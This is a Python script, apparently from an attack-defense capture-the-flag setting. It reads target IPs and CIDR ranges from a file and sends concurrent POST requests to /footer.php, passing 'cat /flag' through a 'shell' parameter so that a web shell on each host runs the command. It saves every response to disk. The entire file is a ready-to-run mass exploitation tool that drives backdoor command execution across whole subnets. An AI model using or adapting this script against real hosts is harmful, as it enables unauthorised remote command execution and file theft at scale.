import os
import ipaddress
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Tuple, Optional

# 配置参数
IP_FILE = 'ip.txt'                  #ip存放位置
OUTPUT_DIR = 'responses'            #响应存放位置
POST_PATH = '/footer.php'           #POST路径
POST_DATA = {'shell': 'cat /flag'}  #POST数据
DEFAULT_PORT = 80                   #默认端口
TIMEOUT = 5                         #超时时间
MAX_WORKERS = 10                    #最大线程数

# 确保输出目录存在
os.makedirs(OUTPUT_DIR, exist_ok=True)

def parse_ip_addresses(file_path: str) -> List[str]:
    """从文件中解析IP地址，支持IP:端口、纯IP和CIDR格式"""
    ip_addresses = []
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                # 处理CIDR格式
                if '/' in line and not line.startswith('#'):
                    try:
                        network = ipaddress.ip_network(line, strict=False)
                        for ip in network.hosts():
                            ip_addresses.append(f"{ip}:{DEFAULT_PORT}")
                    except ValueError:
                        # 如果不是有效的CIDR，尝试作为普通IP处理
                        if ':' in line:
                            ip_addresses.append(line)
                        else:
                            ip_addresses.append(f"{line}:{DEFAULT_PORT}")
                # 处理IP:端口格式
                elif ':' in line:
                    ip_addresses.append(line)
                # 处理纯IP格式
                else:
                    ip_addresses.append(f"{line}:{DEFAULT_PORT}")
    except FileNotFoundError:
        print(f"错误: 找不到IP文件 {file_path}")
    except Exception as e:
        print(f"读取IP文件时出错: {e}")
    
    return ip_addresses

def send_post_request(ip_port: str) -> Tuple[str, Optional[str], Optional[int], Optional[str]]:
    """向目标发送POST请求并返回原始结果"""
    try:
        ip, port = ip_port.split(':')
        url = f"http://{ip}:{port}{POST_PATH}"
        
        print(f"正在向 {url} 发送POST请求...")
        response = requests.post(url, data=POST_DATA, timeout=TIMEOUT)
        
        # 直接返回原始响应内容，不做任何处理
        return ip_port, response.text, response.status_code, None
    except requests.exceptions.Timeout:
        return ip_port, None, None, "连接超时"
    except requests.exceptions.ConnectionError:
        return ip_port, None, None, "连接被拒绝"
    except Exception as e:
        return ip_port, None, None, str(e)

def save_response_to_file(ip_port: str, content: Optional[str], status_code: Optional[int], error: Optional[str]):
    """将响应保存到文件，使用简化的命名格式"""
    # 使用IP_端口格式命名文件，去掉时间戳
    filename = f"{ip_port.replace(':', '_')}.txt"
    filepath = os.path.join(OUTPUT_DIR, filename)
    
    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            # 写入基本元数据
            f.write(f"# 目标: {ip_port}\n")
            f.write(f"# URL: http://{ip_port}{POST_PATH}\n")
            
            if error:
                f.write(f"# 错误: {error}\n\n")
                f.write(f"请求失败: {error}")
            else:
                f.write(f"# 状态码: {status_code}\n\n")
                if content:
                    f.write(content)
        
        print(f"结果已保存到 {filename}")
        return True
    except Exception as e:
        print(f"保存文件时出错: {e}")
        return False

def main():
    """主函数"""
    print(f"开始处理POST请求...")
    print(f"POST数据: {POST_DATA}")
    print(f"目标路径: {POST_PATH}")
    
    # 解析IP地址
    ip_addresses = parse_ip_addresses(IP_FILE)
    if not ip_addresses:
        print("没有找到有效的IP地址")
        return
    
    print(f"找到 {len(ip_addresses)} 个目标")
    
    success_count = 0
    failure_count = 0
    saved_count = 0
    
    # 使用线程池并发处理请求
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # 提交所有任务
        future_to_ip = {executor.submit(send_post_request, ip): ip for ip in ip_addresses}
        
        # 处理完成的任务
        for future in as_completed(future_to_ip):
            ip_port, content, status_code, error = future.result()
            
            if error:
                print(f"{ip_port}: 失败 - {error}")
                failure_count += 1
            else:
                print(f"{ip_port}: 成功 - 状态码 {status_code}")
                success_count += 1
            
            # 保存结果
            if save_response_to_file(ip_port, content, status_code, error):
                saved_count += 1
    
    print("\n=== 执行摘要 ===")
    print(f"总目标数: {len(ip_addresses)}")
    print(f"成功: {success_count}")
    print(f"失败: {failure_count}")
    print(f"保存文件数: {saved_count}")

if __name__ == "__main__":
    main()